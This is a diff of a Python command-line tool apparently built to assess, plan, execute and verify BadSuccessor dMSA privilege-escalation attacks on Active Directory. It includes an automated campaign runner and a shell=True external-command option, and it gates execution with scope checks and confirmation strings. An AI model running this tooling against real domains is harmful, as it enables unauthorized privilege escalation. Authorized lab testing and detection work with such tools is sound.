-                print(
-                    "mode=external evidence-file kerberos-base-proof recorded=true "
-                    "verified_external=false "
-                    f"evidence_sha256={external_meta['evidence_sha256']}"
-                )
-            else:
-                print(
-                    "mode=external evidence-file verified=true "
-                    f"evidence_sha256={external_meta['evidence_sha256']}"
-                )
-        elif kerberos_adapter:
-            if op.status != "executed":
-                raise typer.BadParameter(
-                    "external Kerberos adapter can only run for an executed operation"
-                )
-            if adapter_command_file is not None:
-                adapter_command = _adapter_template_from_file(adapter_command_file)
-            if not adapter_command:
-                raise typer.BadParameter(
-                    "--adapter-command or --adapter-command-file is required with --kerberos-adapter"
-                )
-            rendered = _render_adapter_command(adapter_command, op)
-            if adapter_dry_run:
-                if json_out:
-                    _write_json(
-                        json_out,
-                        {
-                            "mode": "external",
-                            "adapter": kerberos_adapter,
-                            "dry_run": True,
-                            "command_sha256": hashlib.sha256(rendered.encode("utf-8")).hexdigest(),
-                            "operation_id": op.id,
-                        },
-                    )
-                    print(f"[green]wrote adapter dry-run JSON[/green] {json_out}")
-                print(f"adapter={kerberos_adapter} dry-run command={rendered}")
-                return
-            if scope_file is None:
-                raise typer.BadParameter("--scope is required to execute an adapter command")
-            from dmsa_reaper.scope import load_scope
-            scope, _ = load_scope(scope_file)
-            if confirm_string != scope.domain:
-                raise typer.BadParameter(
-                    "--confirm-string must be provided and must exactly match scope.domain "
-                    f"({scope.domain!r})"
-                )
-            proc = subprocess.run(shlex.split(rendered), shell=False, capture_output=True, text=True)
-            output_meta = _external_output_metadata(
-                mode=f"adapter:{kerberos_adapter}",
-                exit_code=proc.returncode,
-                stdout=proc.stdout,
-                stderr=proc.stderr,
-                store_output=False,
-            )
-            if proc.returncode != 0:
-                output_meta["failure_class"] = _classify_external_failure(
-                    proc.stdout, proc.stderr, dmsa=True
-                )
-                output_meta["status"] = "failed"
-                op.metadata["external_adapter"] = output_meta
-                save_operation(op)
-                raise typer.BadParameter(
-                    f"adapter command exited {proc.returncode}; stdout/stderr hashes recorded only"
-                )
-            try:
-                evidence = json.loads(proc.stdout)
-            except json.JSONDecodeError as exc:
-                output_meta["failure_class"] = _classify_external_failure(
-                    proc.stdout, proc.stderr, dmsa=True
-                )
-                output_meta["status"] = "unstructured-output"
-                op.metadata["external_adapter"] = output_meta
-                save_operation(op)
-                raise typer.BadParameter("adapter stdout must be structured JSON evidence") from exc
-            digest = hashlib.sha256(proc.stdout.encode("utf-8")).hexdigest()
-            try:
-                external_meta = validate_kerberos_evidence(op, evidence, digest)
-            except ExternalProofError as exc:
-                output_meta["failure_class"] = "kerberos-tooling-inconclusive"
-                output_meta["status"] = "invalid-proof"
-                op.metadata["external_adapter"] = output_meta
-                save_operation(op)
-                raise typer.BadParameter(str(exc)) from exc
-            external_meta["adapter"] = {
-                "name": kerberos_adapter,
-                "command_sha256": hashlib.sha256(rendered.encode("utf-8")).hexdigest(),
-                "output": output_meta,
-            }
-            if external_meta.get("type") == BASE_PROOF_TYPE:
-                record_kerberos_base_check(op, external_meta)
-            else:
-                record_external_verification(op, external_meta)
-            save_operation(op)
-            if json_out:
-                _write_json(
-                    json_out,
-                    {
-                        "mode": "external",
-                        "operation_id": op.id,
-                        "status": external_meta["status"],
-                        "ok": external_meta["ok"],
-                        "proof": external_meta,
-                        "operation": op.model_dump(mode="json"),
-                    },
-                )
-                print(f"[green]wrote verify JSON[/green] {json_out}")
-            if external_meta.get("type") == BASE_PROOF_TYPE:
-                print(
-                    f"mode=external adapter={kerberos_adapter} kerberos-base-proof recorded=true "
-                    "verified_external=false "
-                    f"evidence_sha256={external_meta['evidence_sha256']}"
-                )
-            else:
-                print(
-                    f"mode=external adapter={kerberos_adapter} verified=true "
-                    f"evidence_sha256={external_meta['evidence_sha256']}"
-                )
-        elif external_argv:
-            # Safe path: no shell, argument list passed directly.
-            proc = subprocess.run(list(external_argv), shell=False, capture_output=True, text=True)
-            ok = proc.returncode == 0
-            try:
-                op.metadata["external_verification"] = _external_output_metadata(
-                    mode="argv",
-                    exit_code=proc.returncode,
-                    stdout=proc.stdout,
-                    stderr=proc.stderr,
-                    argv=list(external_argv),
-                    store_output=store_external_output,
-                )
-            except ValueError as exc:
-                raise typer.BadParameter(str(exc)) from exc
-            if not ok:
-                op.metadata["external_verification"]["failure_class"] = _classify_external_failure(
-                    proc.stdout, proc.stderr
-                )
-            if ok:
-                op.verified = True
-                op.verified_external = True
-                from datetime import datetime, timezone
-                op.external_verified_at = (
-                    datetime.now(timezone.utc)
-                    .replace(microsecond=0)
-                    .isoformat()
-                    .replace("+00:00", "Z")
-                )
-            save_operation(op)
-            if json_out:
-                _write_json(
-                    json_out,
-                    {
-                        "mode": "external",
-                        "operation_id": op.id,
-                        "ok": ok,
-                        "external_verification": op.metadata["external_verification"],
-                        "operation": op.model_dump(mode="json"),
-                    },
-                )
-                print(f"[green]wrote verify JSON[/green] {json_out}")
-            print(f"mode=external argv exit={proc.returncode} verified={ok}")
-        elif external_cmd:
-            if not allow_shell_external:
-                raise typer.BadParameter(
-                    "--external-cmd uses shell=True and requires --allow-shell-external. "
-                    "Prefer --external-argv."
-                )
-            print(
-                "[yellow]WARNING:[/yellow] --external-cmd is executed through the shell "
-                "(shell=True). Do not pass untrusted input. "
-                "Prefer --external-argv for a safer invocation."
-            )
-            proc = subprocess.run(external_cmd, shell=True, capture_output=True, text=True)  # noqa: S602
-            ok = proc.returncode == 0
-            try:
-                op.metadata["external_verification"] = _external_output_metadata(
-                    mode="shell",
-                    exit_code=proc.returncode,
-                    stdout=proc.stdout,
-                    stderr=proc.stderr,
-                    command=external_cmd,
-                    store_output=store_external_output,
-                )
-            except ValueError as exc:
-                raise typer.BadParameter(str(exc)) from exc
-            if not ok:
-                op.metadata["external_verification"]["failure_class"] = _classify_external_failure(
-                    proc.stdout, proc.stderr
-                )
-            if ok:
-                op.verified = True
-                op.verified_external = True
-                from datetime import datetime, timezone
-                op.external_verified_at = (
-                    datetime.now(timezone.utc)
-                    .replace(microsecond=0)
-                    .isoformat()
-                    .replace("+00:00", "Z")
-                )
-            save_operation(op)
-            if json_out:
-                _write_json(
-                    json_out,
-                    {
-                        "mode": "external",
-                        "operation_id": op.id,
-                        "ok": ok,
-                        "external_verification": op.metadata["external_verification"],
-                        "operation": op.model_dump(mode="json"),
-                    },
-                )
-                print(f"[green]wrote verify JSON[/green] {json_out}")
-            print(f"mode=external cmd exit={proc.returncode} verified={ok}")
-        else:
-            raise typer.BadParameter(
-                "--evidence-file, --kerberos-adapter, --external-cmd, or --external-argv "
-                "is required for --mode external.\n"
-                "Preferred: --evidence-file proof.json\n"
-                "Adapter:   --kerberos-adapter external --adapter-command '...'\n"
-                "Legacy:    --external-argv <tool> <args> or --external-cmd \"...\""
-            )
-
-    else:
-        raise typer.BadParameter(f"unsupported --mode: {mode}  (supported: ldap, external)")
-
-
-@badsuccessor_app.command("assess")
-def badsuccessor_assess_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    expand_targets: bool = typer.Option(True, "--expand-targets/--grouped"),
-    exclude_legacy: bool = typer.Option(False, "--exclude-legacy"),
-    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
-    require_kerberos_ready: bool = typer.Option(False, "--require-kerberos-ready"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Assess BadSuccessor-capable paths from map state without LDAP writes."""
-    state = MapState.load(state_path)
-    _require_kerberos_ready_if_requested(state, require_kerberos_ready)
-    assessment = assess_badsuccessor(
-        state,
-        expand_targets=expand_targets,
-        exclude_legacy=exclude_legacy,
-        include_sensitive_targets=include_sensitive_targets,
-    )
-    if json_output:
-        typer.echo(json.dumps(assessment, indent=2, default=str))
-    else:
-        _print_badsuccessor_table(assessment)
-
-
-@badsuccessor_app.command("plan")
-def badsuccessor_plan_cmd(
-    path_id: str = typer.Option(..., "--path"),
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(None, "--paths"),
-    expand_targets: bool = typer.Option(True, "--expand-targets/--grouped"),
-    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Build a structured BadSuccessor plan without LDAP writes."""
-    _, paths = _load_paths_for_state(
-        state_path,
-        paths_file,
-        expand_targets=expand_targets,
-        only=["badsuccessor"],
-        include_sensitive_targets=include_sensitive_targets,
-    )
-    selected = _select_path(paths, path_id)
-    plan = build_badsuccessor_plan(selected)
-    if json_output:
-        typer.echo(json.dumps(plan, indent=2, default=str))
-    else:
-        print(Panel(
-            "\n".join(plan["dry_run_steps"]),
-            title=f"BadSuccessor plan {selected.id} {selected.primitive}",
-            subtitle="No LDAP writes will be made",
-            expand=False,
-        ))
-
-
-@badsuccessor_app.command("execute")
-def badsuccessor_execute_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(None, "--paths"),
-    expand_targets: bool = typer.Option(False, "--expand-targets"),
-    path_id: str = typer.Option(..., "--path"),
-    confirm: bool = typer.Option(False, "--confirm"),
-    confirm_string: Optional[str] = typer.Option(None, "--confirm-string"),
-    dry_run: bool = typer.Option(False, "--dry-run"),
-    scope_file: Optional[Path] = typer.Option(None, "--scope"),
     ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    allow_broad_dacl: bool = typer.Option(False, "--allow-broad-dacl"),
-    allow_legacy_oneway_link: bool = typer.Option(False, "--allow-legacy-oneway-link"),
-    allow_existing_dmsa_legacy_link: bool = typer.Option(
-        False, "--allow-existing-dmsa-legacy-link"
-    ),
-    allow_lab_environment: bool = typer.Option(False, "--allow-lab-environment"),
-    allow_unmapped_target: bool = typer.Option(False, "--allow-unmapped-target"),
-    allow_unmapped_container: bool = typer.Option(False, "--allow-unmapped-container"),
-    allow_unmapped_dmsa: bool = typer.Option(False, "--allow-unmapped-dmsa"),
-    allow_grouped_target_selection: bool = typer.Option(
-        False, "--allow-grouped-target-selection"
-    ),
-    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
     json_out: Optional[Path] = typer.Option(None, "--json"),
-    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
-    dc_ip: Optional[str] = _OPT_DC_IP,
-    dc_host: Optional[str] = _OPT_DC_HOST,
-    username: Optional[str] = _OPT_USER,
-    password: Optional[str] = _OPT_PASS,
-    kerberos: bool = _OPT_KRB,
-    use_ldaps: bool = _OPT_LDAPS,
-    target_dn: Optional[str] = typer.Option(None, "--target-dn"),
-    container_dn: Optional[str] = typer.Option(None, "--container-dn"),
-    chain: Optional[str] = typer.Option(None, "--chain"),
-    dmsa_name: Optional[str] = typer.Option(None, "--dmsa-name"),
-):
-    """Execute a BadSuccessor plan through the existing exploit lifecycle."""
-    _, paths = _load_paths_for_state(
-        state_path,
-        paths_file,
-        expand_targets=expand_targets,
-        only=["badsuccessor"],
-        include_sensitive_targets=include_sensitive_targets,
-    )
-    selected = _select_path(paths, path_id)
-    effective_target = target_dn or selected.target_dn
-    if is_sensitive_target(effective_target) and not include_sensitive_targets:
-        raise typer.BadParameter(
-            "sensitive targets are hidden by default; pass --include-sensitive-targets "
-            "for an authorized lab validation"
-        )
-    if selected.primitive == "legacy-oneway-link" and not allow_legacy_oneway_link:
-        raise typer.BadParameter("legacy-oneway-link requires --allow-legacy-oneway-link")
-    if (
-        selected.primitive == "existing-dmsa-legacy-link"
-        and not allow_existing_dmsa_legacy_link
-    ):
-        raise typer.BadParameter(
-            "existing-dmsa-legacy-link requires --allow-existing-dmsa-legacy-link"
-        )
-    exploit_cmd(
-        state_path=state_path,
-        paths_file=paths_file,
-        expand_targets=False if paths_file else expand_targets,
-        path_id=path_id,
-        primitive_name=None,
-        confirm=confirm,
-        confirm_string=confirm_string,
-        dry_run=dry_run,
-        scope_file=scope_file,
-        ops_dir=ops_dir,
-        allow_broad_dacl=allow_broad_dacl,
-        allow_legacy_oneway_link=allow_legacy_oneway_link,
-        allow_existing_dmsa_legacy_link=allow_existing_dmsa_legacy_link,
-        allow_lab_environment=allow_lab_environment,
-        allow_unmapped_target=allow_unmapped_target,
-        allow_unmapped_container=allow_unmapped_container,
-        allow_unmapped_dmsa=allow_unmapped_dmsa,
-        allow_grouped_target_selection=allow_grouped_target_selection,
-        json_out=json_out,
-        domain=domain,
-        dc_ip=dc_ip,
-        dc_host=dc_host,
-        username=username,
-        password=password,
-        kerberos=kerberos,
-        use_ldaps=use_ldaps,
-        target_dn=target_dn,
-        container_dn=container_dn,
-        chain=chain,
-        dmsa_name=dmsa_name,
-    )
-
-
-@badsuccessor_app.command("verify")
-def badsuccessor_verify_cmd(
-    op_id: str = typer.Option(..., "--op"),
-    mode: str = typer.Option("ldap", "--mode"),
-    evidence_file: Optional[Path] = typer.Option(None, "--evidence-file"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON summary to stdout."),
-    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
-    dc_ip: Optional[str] = _OPT_DC_IP,
-    dc_host: Optional[str] = _OPT_DC_HOST,
-    username: Optional[str] = _OPT_USER,
-    password: Optional[str] = _OPT_PASS,
-    kerberos: bool = _OPT_KRB,
-    use_ldaps: bool = _OPT_LDAPS,
-):
-    """Verify BadSuccessor lifecycle state without conflating LDAP and Kerberos proof."""
-    verify_kwargs: dict[str, Any] = {
-        "op_id": op_id,
-        "mode": mode,
-        "json_out": None,
-        "external_cmd": None,
-        "external_argv": None,
-        "evidence_file": evidence_file,
-        "kerberos_adapter": None,
-        "adapter_command": None,
-        "adapter_command_file": None,
-        "adapter_dry_run": False,
-        "scope_file": None,
-        "confirm_string": None,
-        "allow_shell_external": False,
-        "store_external_output": False,
-        "ops_dir": ops_dir,
-        "domain": domain,
-        "dc_ip": dc_ip,
-        "dc_host": dc_host,
-        "username": username,
-        "password": password,
-        "kerberos": kerberos,
-        "use_ldaps": use_ldaps,
-    }
-    if json_output:
-        import contextlib
-        import io
-        with contextlib.redirect_stdout(io.StringIO()):
-            verify_cmd(**verify_kwargs)
-    else:
-        verify_cmd(**verify_kwargs)
-    op = load_operation(op_id, ops_dir=ops_dir)
-    summary = {
-        "type": "badsuccessor-verification",
-        **operation_lifecycle_summary(op),
-        "full_badsuccessor_success": op.verified_ldap and op.verified_external,
-    }
-    if json_output:
-        typer.echo(json.dumps(summary, indent=2, default=str))
-    else:
-        print(
-            "badsuccessor "
-            f"ldap_verified={str(summary['ldap_verified']).lower()} "
-            f"kerberos_base_verified={str(summary['kerberos_base_verified']).lower()} "
-            f"kerberos_dmsa_verified={str(summary['kerberos_dmsa_verified']).lower()} "
-            f"external_verified={str(summary['external_verified']).lower()}"
-        )
-        if not op.verified_external:
-            print("full BadSuccessor success not claimed: kerberos-dmsa-proof is missing")
-
-
-@badsuccessor_app.command("report")
-def badsuccessor_report_cmd(
-    op_id: str = typer.Option(..., "--op"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Summarize BadSuccessor execution and proof state."""
-    configure_ops_dir(ops_dir)
-    op = load_operation(op_id)
-    report = build_operation_report(op)
-    report["type"] = "badsuccessor-report"
-    if json_output:
-        typer.echo(json.dumps(report, indent=2, default=str))
-    else:
-        print(operation_report_markdown(report))
-
-
-@ouroboros_app.command("assess")
-def ouroboros_assess_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    include_sensitive_targets: bool = typer.Option(False, "--include-sensitive-targets"),
-    require_kerberos_ready: bool = typer.Option(False, "--require-kerberos-ready"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Assess Ouroboros-capable conditions without native secret extraction."""
-    state = MapState.load(state_path)
-    kerberos_ready = None
-    if require_kerberos_ready:
-        ready, notes = _kerberos_ready_for_state(state)
-        if not ready:
-            raise typer.BadParameter(
-                "--require-kerberos-ready failed: " + "; ".join(notes)
-            )
-        kerberos_ready = True
-    assessment = assess_ouroboros(
-        state,
-        include_sensitive_targets=include_sensitive_targets,
-        kerberos_ready=kerberos_ready,
-    )
-    if json_output:
-        typer.echo(json.dumps(assessment, indent=2, default=str))
-    else:
-        _print_ouroboros_summary(assessment)
-
-
-@ouroboros_app.command("plan")
-def ouroboros_plan_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    path_id: Optional[str] = typer.Option(None, "--path"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Produce an Ouroboros plan with proof requirements and no live extraction."""
-    state = MapState.load(state_path)
-    selected = None
-    if path_id:
-        paths = classified_paths(
-            state,
-            expand_targets=True,
-            only=["postpatch-mutual-pair", "existing-dmsa-postpatch-mutual", "self-pkinit-loop"],
-        )
-        selected = _select_path(paths, path_id)
-    plan = build_ouroboros_plan(state, selected)
-    if json_output:
-        typer.echo(json.dumps(plan, indent=2, default=str))
-    else:
-        typer.echo(json.dumps(plan, indent=2, default=str))
-
-
-@ouroboros_app.command("simulate")
-def ouroboros_simulate_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Simulate Ouroboros proof requirements from fixtures/state only."""
-    state = MapState.load(state_path)
-    simulation = build_ouroboros_simulation(state)
-    if json_output:
-        typer.echo(json.dumps(simulation, indent=2, default=str))
-    else:
-        typer.echo(json.dumps(simulation, indent=2, default=str))
-
-
-@ouroboros_app.command("verify")
-def ouroboros_verify_cmd(
-    op_id: str = typer.Option(..., "--op"),
-    evidence_file: Path = typer.Option(..., "--evidence-file"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Record only structured external Ouroboros/dMSA proof for active operations."""
-    configure_ops_dir(ops_dir)
-    op = load_operation(op_id)
-    evidence, digest = load_evidence_file(evidence_file)
-    try:
-        proof = validate_kerberos_evidence(op, evidence, digest)
-    except ExternalProofError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-    if proof.get("type") == BASE_PROOF_TYPE:
-        record_kerberos_base_check(op, proof)
-        verified = False
-    else:
-        record_external_verification(op, proof)
-        verified = True
-    save_operation(op)
-    result = {
-        "type": "ouroboros-verification",
-        "operation_id": op.id,
-        "verified": verified,
-        "proof_type": proof.get("type"),
-        "proof": proof,
-        "operation_lifecycle": operation_lifecycle_summary(op),
-    }
-    if json_output:
-        typer.echo(json.dumps(result, indent=2, default=str))
-    else:
-        print(
-            "ouroboros "
-            f"proof_type={proof.get('type')} verified={str(verified).lower()} "
-            f"external_verified={str(op.verified_external).lower()}"
-        )
-
-
-@ouroboros_app.command("report")
-def ouroboros_report_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    op_id: Optional[str] = typer.Option(None, "--op"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    json_output: bool = typer.Option(False, "--json", help="Print JSON to stdout."),
-):
-    """Report Ouroboros assessment and proof state without exposing secrets."""
-    state = MapState.load(state_path)
-    assessment = assess_ouroboros(state)
-    report: dict[str, Any] = {
-        "type": "ouroboros-report",
-        "assessment": assessment,
-        "persistence_risk_classification": "controlled-lab-validation-only",
-        "detection_guidance": [
-            "Monitor dMSA creation/link attributes and postpatch target-side attributes.",
-            "Monitor Kerberos proof tooling externally; raw ticket data is not logged here.",
-        ],
-    }
-    if op_id:
-        configure_ops_dir(ops_dir)
-        op = load_operation(op_id)
-        report["operation"] = operation_lifecycle_summary(op)
-    if json_output:
-        typer.echo(json.dumps(report, indent=2, default=str))
-    else:
-        typer.echo(json.dumps(report, indent=2, default=str))
-
-
-def _redact_error(text: str, password: str | None = None) -> str:
-    if password:
-        text = text.replace(password, "<redacted>")
-    return text
-
-
-def _run_campaign_step(
-    steps: list[dict[str, Any]],
-    name: str,
-    func,
-    *,
-    artifact: Path | None = None,
-    password: str | None = None,
 ) -> None:
-    try:
-        with contextlib.redirect_stdout(io.StringIO()):
-            func()
-    except Exception as exc:
-        steps.append(campaign_step(
-            name,
-            "failed",
-            artifact=str(artifact) if artifact else None,
-            detail=_redact_error(str(exc), password),
-        ))
-        raise
-    steps.append(campaign_step(name, "ok", artifact=str(artifact) if artifact else None))
-
-
-def _campaign_select_path(paths: list[PathCandidate], requested: str | None) -> PathCandidate:
-    if requested:
-        return _select_path(paths, requested)
-    selected = next((path for path in paths if path.id == "P-0001" and path.executable), None)
-    if selected is None:
-        selected = next((path for path in paths if path.executable), None)
-    if selected is None:
-        raise typer.BadParameter("no executable BadSuccessor path found for campaign")
-    return selected
-
-
-def _campaign_kerberos_ready(payload: dict[str, Any]) -> bool:
-    kerberos = payload.get("kerberos") or {}
-    return bool(
-        kerberos.get("tgt_present")
-        and (
-            kerberos.get("cifs_ticket_present")
-            or kerberos.get("cifs_ticket_obtainable")
+    """Restore attributes and remove objects created by an operation."""
+    configure_ops_dir(ops_dir)
+    operation = load_operation(op_id)
+    if not (operation.cleaned_up and operation.cleanup_verified):
+        effective_domain = domain or operation.metadata.get("domain") or ""
+        effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
+        effective_dc_host = dc_host or operation.metadata.get("dc_host")
+        if not effective_domain and not effective_dc_ip and not effective_dc_host:
+            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
+        conn = bind(
+            _make_ldap_config(
+                str(effective_domain),
+                effective_dc_ip,
+                effective_dc_host,
+                username,
+                password,
+                kerberos,
+                use_ldaps,
+                start_tls,
+            )
         )
-    )
-
-
-def _latest_campaign_operation_id(ops_dir: Path) -> str | None:
-    candidates = sorted(
-        ops_dir.glob("OP-*.json"),
-        key=lambda path: path.stat().st_mtime,
-        reverse=True,
-    )
-    for candidate in candidates:
-        try:
-            return str(json.loads(candidate.read_text(encoding="utf-8")).get("id") or candidate.stem)
-        except (OSError, json.JSONDecodeError):
-            continue
-    return None
-
-
-def _load_campaign_base_proof(base_proof: Path) -> dict[str, Any]:
-    evidence, digest = load_evidence_file(base_proof)
-    try:
-        return validate_kerberos_base_evidence_for_operation(None, evidence, digest)
-    except ExternalProofError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-
-
-@campaign_app.command("run")
-def campaign_run_cmd(
-    profile_name: str = typer.Option("badsuccessor-lab", "--profile"),
-    domain: str = _OPT_DOMAIN,
-    dc_ip: Optional[str] = _OPT_DC_IP,
-    dc_host: Optional[str] = _OPT_DC_HOST,
-    username: Optional[str] = _OPT_USER,
-    password: Optional[str] = _OPT_PASS,
-    kerberos: bool = _OPT_KRB,
-    use_ldaps: bool = _OPT_LDAPS,
-    scope_file: Optional[Path] = typer.Option(None, "--scope"),
-    confirm_string: Optional[str] = typer.Option(None, "--confirm-string"),
-    path_id: Optional[str] = typer.Option(None, "--path"),
-    dmsa_name: str = typer.Option("camp", "--dmsa-name"),
-    base_proof: Optional[Path] = typer.Option(None, "--base-proof"),
-    evidence_file: Optional[Path] = typer.Option(None, "--evidence-file"),
-    dmsa_proof_verifier: Optional[Path] = typer.Option(
-        None,
-        "--dmsa-proof-verifier",
-        help=(
-            "JSON verifier command file for dMSA Kerberos proof. "
-            "Executed after LDAP verify succeeds."
-        ),
-    ),
-    run_kerberos_doctor: bool = typer.Option(True, "--kerberos-doctor/--no-kerberos-doctor"),
-    dry_run: bool = typer.Option(False, "--dry-run"),
-    json_out: Path = typer.Option(Path("campaign.json"), "--json"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    offline_fixture: Optional[Path] = typer.Option(None, "--offline-fixture"),
-):
-    """Run a scoped BadSuccessor operator campaign using the existing lifecycle."""
-    try:
-        profile = get_profile(profile_name)
-    except ValueError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-    if not dry_run and profile.require_scope_for_confirm and scope_file is None and profile.execute_allowed:
-        raise typer.BadParameter("--scope is required for confirmed campaign execution")
-    if (
-        not dry_run
-        and profile.require_confirm_string
-        and not confirm_string
-        and profile.execute_allowed
-    ):
-        raise typer.BadParameter("--confirm-string is required for confirmed campaign execution")
-
-    campaign_id = new_campaign_id()
-    campaign_dir = json_out.parent / campaign_id
-    campaign_dir.mkdir(parents=True, exist_ok=True)
-    effective_ops_dir = ops_dir or (campaign_dir / "operations")
-    state_path = campaign_dir / "state.json"
-    paths_path = campaign_dir / "paths.json"
-    doctor_path = campaign_dir / "doctor.json"
-    kerberos_path = campaign_dir / "kerberos-doctor.json"
-    assess_path = campaign_dir / "badsuccessor-assess.json"
-    plan_path = campaign_dir / "badsuccessor-plan.json"
-    dry_run_path = campaign_dir / "badsuccessor-dry-run.json"
-    exec_path = campaign_dir / "badsuccessor-execute.json"
-    verify_path = campaign_dir / "badsuccessor-verify-ldap.json"
-    external_path = campaign_dir / "badsuccessor-verify-external.json"
-    report_path = campaign_dir / "badsuccessor-report.json"
-    steps: list[dict[str, Any]] = []
-    op_id: str | None = None
-    failed = False
-    ldap_verified = False
-    kerberos_base_ready = False
-    kerberos_dmsa_verified = False
-    full_success = False
-    base_proof_meta: dict[str, Any] | None = None
-
-    try:
-        if offline_fixture:
-            state = load_offline_fixture(offline_fixture)
-            state.save(state_path)
-            steps.append(campaign_step("doctor", "offline-skipped"))
-            steps.append(campaign_step("map", "ok", artifact=str(state_path)))
-        else:
-            _run_campaign_step(
-                steps,
-                "doctor",
-                lambda: doctor_cmd(
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_host=dc_host,
-                    username=username,
-                    password=password,
-                    kerberos=kerberos,
-                    use_ldaps=use_ldaps,
-                    scope_file=scope_file,
-                    ops_dir=effective_ops_dir,
-                    json_out=doctor_path,
-                ),
-                artifact=doctor_path,
-                password=password,
-            )
-            _run_campaign_step(
-                steps,
-                "map",
-                lambda: map_cmd(
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_host=dc_host,
-                    username=username,
-                    password=password,
-                    kerberos=kerberos,
-                    use_ldaps=use_ldaps,
-                    sdflags=hex(DEFAULT_SD_FLAGS),
-                    try_sacl=False,
-                    target_filter=None,
-                    container_filter=None,
-                    max_targets=None,
-                    only_current_principal=False,
-                    json_out=state_path,
-                    offline_fixture=None,
-                ),
-                artifact=state_path,
-                password=password,
-            )
-
-        state = MapState.load(state_path)
-        dc_fqdn = dc_host
-        if not dc_fqdn and state.environment.dcs:
-            dc_fqdn = (
-                state.environment.dcs[0].get("dNSHostName")
-                or state.environment.dcs[0].get("dnsHostName")
-                or state.environment.dcs[0].get("name")
-            )
-        if run_kerberos_doctor:
-            kerberos_payload = {
-                "kerberos": inspect_kerberos_environment(
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_host=dc_host,
-                    dc_fqdn=dc_fqdn,
-                    run_cache_checks=True,
-                    attempt_cifs_ticket=True,
-                ).to_json(),
-                "dns": inspect_dns_environment(
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_fqdn=dc_fqdn,
-                ).to_json(),
-            }
-            _write_json(kerberos_path, kerberos_payload)
-            kerberos_base_ready = _campaign_kerberos_ready(kerberos_payload)
-            steps.append(campaign_step(
-                "kerberos-doctor",
-                "ok" if kerberos_base_ready else "warning",
-                artifact=str(kerberos_path),
-            ))
-        if base_proof:
-            base_proof_path = campaign_dir / "kerberos-base-proof.json"
-            try:
-                base_proof_meta = _load_campaign_base_proof(base_proof)
-            except Exception as exc:
-                steps.append(campaign_step(
-                    "kerberos-base-proof",
-                    "failed",
-                    artifact=str(base_proof),
-                    detail=_redact_error(str(exc), password),
-                ))
-                raise
-            _write_json(base_proof_path, base_proof_meta)
-            kerberos_base_ready = True
-            steps.append(campaign_step(
-                "kerberos-base-proof",
-                "ok",
-                artifact=str(base_proof_path),
-            ))
-
-        paths = classified_paths(
-            state,
-            expand_targets=profile.expand_targets,
-            only=list(profile.allowed_primitives),
-            exclude_legacy=profile.exclude_legacy,
-            include_sensitive_targets=profile.include_sensitive_targets,
-        )
-        _write_json(paths_path, [path.model_dump(mode="json") for path in paths])
-        steps.append(campaign_step("paths", "ok", artifact=str(paths_path)))
-        selected = _campaign_select_path(paths, path_id)
-        _write_json(
-            assess_path,
-            assess_badsuccessor(
-                state,
-                expand_targets=profile.expand_targets,
-                exclude_legacy=profile.exclude_legacy,
-                include_sensitive_targets=profile.include_sensitive_targets,
-            ),
-        )
-        steps.append(campaign_step("badsuccessor-assess", "ok", artifact=str(assess_path)))
-        _write_json(plan_path, build_badsuccessor_plan(selected))
-        steps.append(campaign_step("badsuccessor-plan", "ok", artifact=str(plan_path)))
-
-        _run_campaign_step(
-            steps,
-            "badsuccessor-execute-dry-run",
-            lambda: badsuccessor_execute_cmd(
-                state_path=state_path,
-                paths_file=paths_path,
-                expand_targets=profile.expand_targets,
-                path_id=selected.id,
-                confirm=False,
-                confirm_string=confirm_string,
-                dry_run=True,
-                scope_file=scope_file,
-                ops_dir=effective_ops_dir,
-                allow_broad_dacl=False,
-                allow_legacy_oneway_link=False,
-                allow_existing_dmsa_legacy_link=False,
-                allow_lab_environment=False,
-                allow_unmapped_target=False,
-                allow_unmapped_container=False,
-                allow_unmapped_dmsa=False,
-                allow_grouped_target_selection=False,
-                include_sensitive_targets=profile.include_sensitive_targets,
-                json_out=dry_run_path,
-                domain=None,
-                dc_ip=None,
-                dc_host=None,
-                username=None,
-                password=None,
-                kerberos=False,
-                use_ldaps=False,
-                target_dn=None,
-                container_dn=None,
-                chain=None,
-                dmsa_name=dmsa_name,
-            ),
-            artifact=dry_run_path,
-            password=password,
-        )
-
-        if dry_run or not profile.execute_allowed:
-            steps.append(campaign_step("badsuccessor-execute-confirm", "skipped"))
-        else:
